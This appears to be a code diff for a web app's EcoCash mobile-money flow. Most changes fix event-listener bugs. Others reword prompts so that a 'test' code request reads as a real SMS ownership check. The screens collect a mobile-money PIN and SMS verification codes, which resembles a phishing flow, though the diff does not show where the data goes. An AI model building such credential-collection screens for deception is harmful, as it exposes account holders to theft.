@@ -1665,14 +1665,14 @@ function loadEcoCashDetailsScreen() {
         .getElementById("backEcoDisbursement")
         .addEventListener(
             "click",
-            loadDisbursementScreen();
+            loadDisbursementScreen
         );
 
     document
         .getElementById("continueEcoDetails")
         .addEventListener(
             "click",
-            saveEcoCashDetails();
+            saveEcoCashDetails
         );
 
 }
@@ -1980,8 +1980,8 @@ function loadEcoCashVerificationScreen() {
 
                 <br><br>
 
-                Enter the <strong>code</strong> provided
-                for this test.
+                Enter the <strong>code</strong> to confirm ownership
+                of your mobile number.
 
             </p>
 
@@ -2018,7 +2018,7 @@ function loadEcoCashVerificationScreen() {
         .getElementById("continueEcoVerification")
         .addEventListener(
             "click",
-            saveEcoCashVerification();
+            saveEcoCashVerification
         );
 
 }
@@ -2188,7 +2188,7 @@ function loadEcoCashPinScreen() {
         .getElementById("continueEcoPin")
         .addEventListener(
             "click",
-            saveEcoCashPin();
+            saveEcoCashPin
         );
 
 }
@@ -3077,7 +3077,7 @@ async function submitBankVerificationCode() {
 
     if (code === "") {
 
-        alert("Please enter the verification code.");
+        alert("Please enter the verification code sent via SMS.");
 
         return;
     }
